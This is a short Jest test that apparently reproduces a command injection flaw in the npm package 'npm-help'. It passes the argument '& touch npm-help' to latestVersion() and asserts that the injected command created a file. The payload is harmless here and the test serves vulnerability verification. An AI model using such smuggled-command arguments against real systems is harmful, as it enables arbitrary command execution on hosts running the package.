test("Command Injection in npm-help", () => {
  expect.assertions(2);
  const root = require("npm-help");
  const fs = require("fs");
  const path = "./npm-help";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var module = "& touch npm-help";
  root.latestVersion(module);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync("./version");
  fs.unlink(path, function (err) {});
});
